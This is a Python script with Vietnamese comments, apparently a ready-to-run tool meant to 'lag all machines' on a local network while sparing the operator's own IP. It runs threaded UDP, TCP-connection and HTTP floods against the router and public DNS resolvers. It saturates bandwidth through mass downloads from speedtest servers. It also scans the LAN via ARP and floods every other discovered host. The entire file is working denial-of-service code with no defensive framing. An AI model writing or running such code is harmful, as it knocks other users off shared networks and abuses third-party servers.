import requests
import threading
import time
import os
import subprocess
import random
import socket

# ===== CẤU HÌNH =====
ROUTER_IP = "192.168.1.1"
MY_IP = "192.168.1.30"  # <<< IP ĐƯỢC BẢO VỆ (KHÔNG BỊ LAG)
THOI_GIAN = 60  # 60 giây

print(f"🛡️ IP được bảo vệ: {MY_IP} (SẼ KHÔNG BỊ LAG)")

# ==============================================
# CÁCH 1: TẢI FILE BẰNG CURL (HIỆU QUẢ NHẤT)
# ==============================================
def download_with_wget():
    """Dùng curl/wget để tải file - hiệu quả hơn requests rất nhiều"""
    urls = [
        "http://speedtest.tele2.net/100MB.zip",
        "http://speedtest.tele2.net/50MB.zip",
        "http://ipv4.download.thinkbroadband.com/100MB.zip",
        "https://www.thinkbroadband.com/download/100MB.zip",
    ]
    while True:
        try:
            url = random.choice(urls)
            if os.name == 'nt':  # Windows
                subprocess.run(['curl', '-s', '-o', 'NUL', url], timeout=5)
            else:  # Linux/Mac
                subprocess.run(['wget', '-q', '-O', '/dev/null', url], timeout=5)
        except:
            pass

# ==============================================
# CÁCH 2: DOWNLOAD BẰNG REQUESTS
# ==============================================
def download_large_chunk():
    """Tải với chunk lớn để tăng tốc độ"""
    urls = [
        "http://speedtest.tele2.net/100MB.zip",
        "http://speedtest.tele2.net/50MB.zip",
        "http://ipv4.download.thinkbroadband.com/100MB.zip",
        "http://cachefly.cachefly.net/100mb.test",
    ]
    while True:
        try:
            url = random.choice(urls)
            r = requests.get(url, stream=True, timeout=3)
            for chunk in r.iter_content(chunk_size=1024*1024):  # 1MB
                pass
        except:
            pass

# ==============================================
# CÁCH 3: UDP FLOOD - KHÔNG TẤN CÔNG IP ĐƯỢC BẢO VỆ
# ==============================================
def udp_massive():
    """Gửi UDP với tần suất cực cao - CHỈ VÀO ROUTER"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 65507
    targets = [
        (ROUTER_IP, 53),
        (ROUTER_IP, 80),
        (ROUTER_IP, 443),
        ("8.8.8.8", 53),
        ("1.1.1.1", 53),
    ]
    while True:
        try:
            for target in targets:
                for _ in range(100):
                    sock.sendto(payload, target)
        except:
            pass

# ==============================================
# CÁCH 4: TCP CONNECTION FLOOD
# ==============================================
def tcp_connections():
    """Tạo hàng ngàn kết nối TCP - CHỈ VÀO ROUTER"""
    sockets = []
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((ROUTER_IP, 80))
            sockets.append(s)
            if len(sockets) > 5000:
                for _ in range(100):
                    try:
                        old = sockets.pop(0)
                        old.close()
                    except:
                        pass
        except:
            pass

# ==============================================
# CÁCH 5: HTTP FLOOD
# ==============================================
def http_flood():
    """Gửi HTTP request liên tục đến router"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((ROUTER_IP, 80))
            s.send(b"GET / HTTP/1.1\r\nHost: " + ROUTER_IP.encode() + b"\r\n\r\n" * 100)
            s.close()
        except:
            pass

# ==============================================
# CÁCH 6: TẤN CÔNG VÀO CÁC MÁY KHÁC (TRỪ IP ĐƯỢC BẢO VỆ)
# ==============================================
def scan_and_attack():
    """Quét mạng và tấn công các máy khác (TRỪ IP ĐƯỢC BẢO VỆ)"""
    while True:
        try:
            # Quét các IP trong mạng
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            target_ips = []
            
            for line in lines:
                if '192.168.' in line:
                    parts = line.split()
                    for part in parts:
                        if part.startswith('192.168.') and '.' in part:
                            if part != ROUTER_IP and part != MY_IP:
                                target_ips.append(part)
            
            target_ips = list(set(target_ips))
            
            # Tấn công các IP tìm được
            for ip in target_ips:
                try:
                    # Gửi UDP đến máy đó
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(b"X" * 65507, (ip, 80))
                    sock.sendto(b"X" * 65507, (ip, 443))
                    sock.sendto(b"X" * 65507, (ip, 445))
                    sock.close()
                except:
                    pass
        except:
            pass
        time.sleep(0.1)

# ==============================================
# MONITOR
# ==============================================
def monitor():
    """Hiển thị băng thông đang sử dụng"""
    try:
        import psutil
        while True:
            net = psutil.net_io_counters()
            dl_mbps = net.bytes_recv / 1024 / 1024 * 8
            ul_mbps = net.bytes_sent / 1024 / 1024 * 8
            total_gb = (net.bytes_recv + net.bytes_sent) / 1024**3
            print(f"\r📡 DL: {dl_mbps:.0f} Mbps  UL: {ul_mbps:.0f} Mbps  |  Tổng: {total_gb:.2f}GB  |  🛡️ IP được bảo vệ: {MY_IP}", end="", flush=True)
            time.sleep(0.5)
    except:
        pass

# ==============================================
# MAIN
# ==============================================
def main():
    print("=" * 70)
    print("🔥 LAG TẤT CẢ MÁY - BẢO VỆ IP 192.168.1.30")
    print("=" * 70)
    print(f"🛡️ IP ĐƯỢC BẢO VỆ: {MY_IP} (KHÔNG BỊ LAG)")
    print(f"📡 Router IP: {ROUTER_IP}")
    print(f"⏱️ Thời gian: {THOI_GIAN} giây")
    print("=" * 70)
    print("⚔️ VŨ KHÍ SỬ DỤNG:")
    print("  📥 Download Flood    - 20 luồng")
    print("  📥 Curl Download     - 20 luồng")
    print("  📤 UDP Flood         - 10 luồng")
    print("  🔗 TCP Flood         - 5 luồng")
    print("  🌐 HTTP Flood        - 10 luồng")
    print("  🔍 Quét & Tấn công   - 5 luồng")
    print("=" * 70)
    print(f"✅ IP {MY_IP} SẼ KHÔNG BỊ ẢNH HƯỞNG")
    print("❌ CÁC IP KHÁC SẼ BỊ LAG")
    print("=" * 70)
    
    confirm = input("\n⚠️ Nhập 'yes' để bắt đầu: ")
    if confirm.lower() != 'yes':
        print("Đã hủy.")
        return
    
    print("\n🚀 KHỞI ĐỘNG TẤN CÔNG...")
    
    # ===== TẠO CÁC LUỒNG TẤN CÔNG =====
    
    # 1. Download bằng requests - 20 luồng
    print("📡 20 luồng Download requests...")
    for i in range(20):
        threading.Thread(target=download_large_chunk, daemon=True).start()
    
    # 2. Download bằng curl/wget - 20 luồng
    print("📡 20 luồng Download curl/wget...")
    for i in range(20):
        threading.Thread(target=download_with_wget, daemon=True).start()
    
    # 3. UDP Flood - 10 luồng
    print("📡 10 luồng UDP Flood...")
    for i in range(10):
        threading.Thread(target=udp_massive, daemon=True).start()
    
    # 4. TCP Flood - 5 luồng
    print("📡 5 luồng TCP Flood...")
    for i in range(5):
        threading.Thread(target=tcp_connections, daemon=True).start()
    
    # 5. HTTP Flood - 10 luồng
    print("📡 10 luồng HTTP Flood...")
    for i in range(10):
        threading.Thread(target=http_flood, daemon=True).start()
    
    # 6. Quét và tấn công các máy khác - 5 luồng
    print("📡 5 luồng Quét & Tấn công...")
    for i in range(5):
        threading.Thread(target=scan_and_attack, daemon=True).start()
    
    # 7. Monitor
    threading.Thread(target=monitor, daemon=True).start()
    
    print("\n" + "=" * 70)
    print("🔥🔥🔥 ĐANG TẤN CÔNG TẤT CẢ MÁY!")
    print(f"🛡️ IP {MY_IP} VẪN DÙNG BÌNH THƯỜNG")
    print("❌ CÁC IP KHÁC SẼ BỊ CHẬM")
    print("=" * 70)
    
    # Đếm ngược
    for i in range(THOI_GIAN, 0, -1):
        print(f"\r⏱️ Còn {i:2d} giây...  🛡️ IP được bảo vệ: {MY_IP}", end="", flush=True)
        time.sleep(1)
    
    print("\n\n" + "=" * 70)
    print("✅ KẾT THÚC!")
    print(f"🛡️ IP {MY_IP} đã được bảo vệ thành công")
    print("🔓 Mạng trở lại bình thường")
    print("=" * 70)

if __name__ == "__main__":
    try:
        import psutil
    except:
        os.system('pip install psutil')
        import psutil
    
    main()